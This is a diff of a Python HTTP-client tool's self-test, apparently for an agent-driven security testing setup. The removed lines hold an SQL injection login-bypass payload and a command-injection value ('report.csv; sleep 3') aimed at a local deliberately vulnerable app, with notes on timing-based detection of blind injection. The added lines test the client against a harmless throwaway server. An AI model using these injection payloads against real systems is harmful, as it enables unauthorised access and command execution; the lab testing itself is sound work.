@@ -90,41 +90,71 @@ class _NoRedirect(urllib.request.HTTPRedirectHandler):
 
 
 def demo() -> None:
-    """Proves V1 (SQLi auth bypass) and V2 (command injection) are exploitable through
-    this tool alone, no LLM/Docker involved. Requires vulnshop running at :5000."""
+    """Self-contained: spins up a throwaway stdlib server rather than depending on an
+    external target being up. Exercises the client itself — form encoding, query
+    params, status codes, and elapsed timing."""
     import shutil
     import tempfile
+    import threading
+    import urllib.parse
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
+    class Handler(BaseHTTPRequestHandler):
+        protocol_version = "HTTP/1.1"
+
+        def _reply(self, status: int, body: str) -> None:
+            payload = body.encode()
+            self.send_response(status)
+            self.send_header("Content-Type", "text/plain")
+            self.send_header("Content-Length", str(len(payload)))
+            self.end_headers()
+            self.wfile.write(payload)
+
+        def do_POST(self):  # noqa: N802
+            length = int(self.headers.get("Content-Length", "0"))
+            form = urllib.parse.parse_qs(self.rfile.read(length).decode())
+            user = (form.get("user") or [""])[0]
+            self._reply(200, f"hello {user}") if user else self._reply(401, "denied")
+
+        def do_GET(self):  # noqa: N802
+            parsed = urllib.parse.urlparse(self.path)
+            params = urllib.parse.parse_qs(parsed.query)
+            if parsed.path == "/slow":
+                time.sleep(float((params.get("s") or ["0"])[0]))
+                self._reply(200, "slept")
+            elif parsed.path == "/big":
+                self._reply(200, "A" * 20000)
+            else:
+                self._reply(200, "echo:" + (params.get("q") or [""])[0])
+
+        def log_message(self, *args):
+            pass
+
+    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    base = f"http://127.0.0.1:{server.server_address[1]}"
     tmp = Path(tempfile.mkdtemp())
     try:
-        # V1 — auth-bypass SQLi against a seeded admin/admin123 user with wrong password.
-        bypass = do_http_request(
-            "POST", "http://127.0.0.1:5000/login", tmp,
-            data={"username": "admin' -- ", "password": "definitely-wrong"},
-        )
-        legit_wrong = do_http_request(
-            "POST", "http://127.0.0.1:5000/login", tmp,
-            data={"username": "admin", "password": "definitely-wrong"},
-        )
-        assert bypass["status_code"] == 200 and "Welcome" in bypass["body"], bypass
-        assert legit_wrong["status_code"] == 401, legit_wrong
-
-        # V2 — command injection via `os.system("cat exports/" + filename)`. The
-        # response is always the literal string "Export started" regardless of what
-        # the injected command does (os.system's stdout goes to the server process,
-        # not the HTTP response) — this is *blind* command injection, so the real
-        # proof technique is a timing side-channel: inject a `sleep` and show the
-        # response takes measurably longer, not string-matching a response body.
-        baseline = do_http_request("GET", "http://127.0.0.1:5000/export", tmp, params={"file": "report.csv"})
-        injected = do_http_request(
-            "GET", "http://127.0.0.1:5000/export", tmp,
-            params={"file": "report.csv; sleep 3"},
-        )
-        assert baseline["status_code"] == 200 and injected["status_code"] == 200
-        assert injected["elapsed_ms"] - baseline["elapsed_ms"] > 2500, (baseline, injected)
+        # Form-encoded POST: what Flask's request.form reads.
+        ok = do_http_request("POST", f"{base}/login", tmp, data={"user": "admin"})
+        assert ok["status_code"] == 200 and ok["body"] == "hello admin", ok
+        # A non-2xx is returned, not raised — the agent must see the status.
+        denied = do_http_request("POST", f"{base}/login", tmp, data={"user": ""})
+        assert denied["status_code"] == 401, denied
+        # Query params.
+        echoed = do_http_request("GET", f"{base}/echo", tmp, params={"q": "hi there"})
+        assert echoed["body"] == "echo:hi there", echoed
+        # Elapsed timing is real — this is the oracle blind command injection relies on.
+        fast = do_http_request("GET", f"{base}/slow", tmp, params={"s": "0"})
+        slow = do_http_request("GET", f"{base}/slow", tmp, params={"s": "1"})
+        assert slow["elapsed_ms"] - fast["elapsed_ms"] > 700, (fast["elapsed_ms"], slow["elapsed_ms"])
+        # Oversized bodies are bounded and spooled.
+        big = do_http_request("GET", f"{base}/big", tmp)
+        assert big["truncated"] is True and big["body_ref"], big
     finally:
-        shutil.rmtree(tmp)
-    print("http_request: ok (V1 auth-bypass + V2 command-injection both confirmed live)")
+        server.shutdown()
+        shutil.rmtree(tmp, ignore_errors=True)
+    print("http_request: ok")
 
 
 if __name__ == "__main__":
